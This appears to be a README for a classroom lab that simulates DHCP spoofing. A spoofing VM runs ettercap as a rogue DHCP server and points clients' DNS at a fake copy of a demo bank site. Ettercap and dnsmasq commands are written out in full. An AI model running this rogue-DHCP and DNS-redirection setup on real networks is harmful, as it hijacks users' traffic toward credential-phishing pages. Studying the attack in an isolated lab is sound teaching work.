# Demobank

This is designed to simulate dhcp spoofing which then redirects real endpoints to a dns that has malicious "spoofed" website instead of the "real" website. It is not meant to spoof a real https website due to complexities, but to show the possibility of dhcp spoofing in general without mitm. 

# Setup of the VMs

Real/legitimate and spoof vm:
Setting	                            Value
Enable Network Adapter	            Yes
Attached to	                        Internal Network
Name	                            dhcp-lab
Adapter Type	                    Intel PRO/1000 MT Desktop
Cable Connected	                    Yes
Additional adapters	                Disabled

IP's for real/spoof:
1. Open Settings → Network.
2. Under Wired, click the gear icon .
3. Select the IPv4 tab.
4. Change IPv4 Method from Automatic (DHCP) to Manual.
5. Enter the following settings:
Setting	    Legitimate VM	        Spoofing VM
Address	    192.168.50.10	        192.168.50.20
Netmask	    255.255.255.0	        255.255.255.0
Gateway	    Leave blank	            Leave blank
DNS	        192.168.50.10	        192.168.50.20
6. Click Apply.
7. Toggle the wired connection off and back on.

For client:
Go to Settings -> Network -> Wired -> IPv4 and choose:
- IPv4 Method: Automatic (DHCP)
- DNS: Automatic



# To Sign in on real website

Password for the legitimate is Username: student123 and Password: DemoPass123!

# Try running the experiment.bash first on both the spoofer and the real vms

First, compile the bash file on the vm:
chmod +x deploy.sh

For real:
./deploy.sh --real

For spoof:
./deploy.sh --spoof





# Gathering Information to Start

First, 

ip -br -4 addr

to get the address and link associated.






# To run installation for real vm:

sudo apt update
sudo apt install dnsmasq dnsutils

- Replace 192.168.50.10 with whatever the ip is from above. 
- Replace eth0 with the link associated with the ip above.
- Replace 192.168.50 in the dhcp-range with 192.168.50 subnet from the ip above.

# copy below to EOF, change bullets above, paste in terminal

sudo tee /etc/dnsmasq.d/bankdemo.conf > /dev/null <<'EOF'
interface=eth0
listen-address=192.168.50.10
bind-interfaces

# Offline lab DNS
no-resolv
address=/bankdemo.test/192.168.50.10

# Legitimate DHCP
dhcp-range=192.168.50.100,192.168.50.150,255.255.255.0,1h
dhcp-option=option:dns-server,192.168.50.10

# No default gateway: this VM is not routing traffic
dhcp-option=option:router
log-dhcp
EOF

# run these tests sepreate
sudo dnsmasq --test
sudo systemctl enable dnsmasq
sudo systemctl restart dnsmasq
sudo systemctl status dnsmasq

# run the website in a seperate terminal 

For "real" bank: `(cd legitimate-bank && sudo python3 -u server.py --host 192.168.9.84)` but change the ip with the vm's ifconfig ip
do not copy the ``





# To run installation for spoof vm:

sudo apt update
sudo apt install dnsmasq dnsutils ettercap-text-only tcpdump

- Replace 192.168.50.20 with whatever the ip is from above. 
- Replace eth0 with the link associated with the ip above.
- Replace 192.168.50 in the dhcp-range with 192.168.50 subnet from the ip above.

# copy below to EOF, change bullets above, paste in terminal

sudo tee /etc/dnsmasq.d/bankdemo.conf > /dev/null <<'EOF'
interface=eth0
listen-address=192.168.50.20
bind-interfaces

# Offline lab DNS
no-resolv
address=/bankdemo.test/192.168.50.20

# Do not provide DHCP from dnsmasq
no-dhcp-interface=eth0
EOF

# run ettercap but replace the ips as it says above
sudo ettercap -T -q -i eth0 \
  -M "dhcp:192.168.50.160-170/255.255.255.0/192.168.50.20"

# run the web server in a different terminal

For "Spoof" bank: `(cd spoofed-bank && sudo python3 -u server.py --host 192.168.9.84)` but change the ip with the vm's ifconfig ip
do not copy the ``
